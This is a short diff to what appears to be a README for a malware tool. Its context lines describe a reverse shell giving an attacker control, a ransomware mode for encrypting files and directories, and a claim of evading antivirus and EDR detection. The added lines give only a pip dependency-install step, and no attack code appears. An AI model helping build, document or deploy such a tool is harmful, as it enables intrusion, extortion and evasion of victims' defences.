@@ -12,6 +12,10 @@ This program is designed to implement a reverse shell and give the attacker the 
 Usage
 - To use the ransomware functionality, you can use the -help command to see examples of how to encrypt files and directories.
 
+### Running the program
+To successfully run the program, you need to install the required dependencies by running the following command:
+- pip install -r requirements.txt
+
 ### Detection and evasion
 This program is designed to not be detected or blocked by any antivirus or endpoint detection and response (EDR) software. However, as with any potentially malicious software, use caution when deploying and using this program.
 
